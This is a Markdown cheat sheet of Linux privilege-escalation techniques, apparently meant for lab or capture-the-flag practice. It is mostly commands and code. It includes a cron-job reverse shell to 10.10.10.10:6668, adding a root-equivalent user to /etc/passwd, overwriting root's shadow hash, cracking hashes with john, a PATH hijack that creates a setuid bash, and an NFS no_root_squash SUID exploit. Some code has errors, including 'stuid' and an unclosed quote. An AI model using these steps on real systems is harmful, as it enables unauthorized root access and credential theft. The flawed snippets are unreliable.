# _Privilege Escalation for Linux (Cheat-Sheet)_

> ## **Sudo - Shell Escape Sequences**
>
> command `sudo -l`  
> Visit [GTFOBins](https://gtfobins.github.io/) and search for some of the program names. If the program is listed with "sudo" as a function, you can use it to elevate privileges, usually via an escape sequence.

> ## **SUID (Set-user Identification)**
>
> _command_ `find / -type f -perm -04000 -ls 2>/dev/null`  
> or  
> `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null` will list files that have SUID or SGID bits set.  
> Visit Search result: [GTFOBins](https://gtfobins.github.io/)  
> try read the `/etc/shadow` file or adding our user to `/etc/passwd`
> add a new user that has root privileges.  
> We will need the hash value of the password we want the new user to have. This can be done quickly using the openssl tool on Kali Linux: _command_ `openssl passwd -1 -salt foo` Result: _$1$pyuddMjp$3.deTnHdrVVVLoh5zkQ0B._  
> We will then add this password with a username to the `/etc/passwd` file: _hacker:$1$pyuddMjp$3.deTnHdrVVVLoh5zkQ0B.:0:0:root:/root:/bin/bash_  
> Once our user is added we will need to switch to this user and hopefully should have root privileges.  
> **With _unshadow_ and _john_:**  
>  unshadow necesita los archivos _/etc/shadow_ and _/etc/passwd_  
>  create with result _shadow.txt_ and _passwd.txt_  
>  _command_ `unshadow passwd.txt shadow.txt > passwords`  
>  `john passwords` -> default brute force or `john --wordlist=diccionario.lst --rules password`

> ## **Capabilities**
>
> _command_ `getcap -r / 2>/dev/null`  
> Search [GTFOBins](https://gtfobins.github.io/) has a good list of binaries that can be leveraged for privilege escalation if we find any set capabilities.

> ## **Cron Jobs - File Permissions**
>
> _command_ `cat /etc/crontab`  
> `locate overwrite.sh` or `locate backup.sh`  
> A similar situation where the "any.sh" script was deleted, but the cron job still exists.
> If the full path of the script is not defined, cron will refer to the paths listed under the PATH variable in the _/etc/crontab_ file. In this case, we should be able to create a script named “any.sh” under our user’s home folder and it should be run by the cron job.  
> _modify or create script_

```sh
#!/bin/bash

bash -i >& /dev/tcp/10.10.10.10/6668 0>&1
```

> We will now run a listener on our attacking machine to receive the incoming connection:  
> _command_ `nc -nlvp 6668`

> ## **Cron Jobs - PATH Enviroment Variable**
>
> _command_ `cat /etc/crontab`  
> Note that the PATH variable starts with /home/user which is our user's home directory.  
> Create a file called overwrite.sh in your home directory with the following contents:  
> _modify script_

```sh
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```

> Make sure that the file is executable:  
> `chmod +x /home/user/overwrite.sh`  
> Wait for the cron job to run (should not take longer than a minute). Run the /tmp/rootbash command with -p to gain a shell running with root privileges: `/tmp/rootbash -p`

> ## **Weak File Permissions - Writable /etc/passwd**
>
> `ls -l /etc/passwd`  
> Generate a new password hash with a password of your choice:  
> `openssl passwd newpasswordhere`  
> Edit the /etc/passwd file and place the generated password hash between the first and second colon (:) of the root user's row (replacing the "x").  
> Switch to the root user, using the new password.

> ## **Weak File Permissions - Writable /etc/shadow**
>
> `ls -l /etc/shadow`  
> Generate a new password hash with a password of your choice:  
> `mkpasswd -m sha-512 newpasswordhere`  
> Edit the /etc/shadow file and replace the original root user's password hash with the one you just generated.  
> Switch to the root user, using the new password.

> ## **NFS (Network File Sharing)**
>
> configuration is kept in the _/etc/exports_ file. This file is created during the NFS server installation and can usually be read by users.  
>  _command_ `cat /etc/exports`  
>  The critical element for this privilege escalation vector is the “no_root_squash”. By default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges. If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.  
>  We will start by enumerating mountable shares from our attacking machine: `showmount -e 10.10.10.10`  
>  We will mount one of the “no_root_squash” shares to our attacking machine and start building our executable: `mkdir /tmp/backupsonattackermachine`  
>  `mount -o rw 10.10.10.10:/fileexport /tmp/backupsonattackermachine`  
>  As we can set SUID bits, a simple executable that will run /bin/bash on the target system will do the job: `nano nfs.c`

```c
int main()
{ setgid(0);
  stuid(0);
  system("/bin/bash");
  return 0;
}
```

> Once we compile the code we will set the SUID bit: `gcc nfs.c -o nfs -w`  
>  `chmod +s nfs`  
>  `ls -l nfs`  
>  `./nfs`

> ## **Python**

```sh
python3 -c 'import pty;pty.spawn("/bin/bash")
export TERM=xterm
```
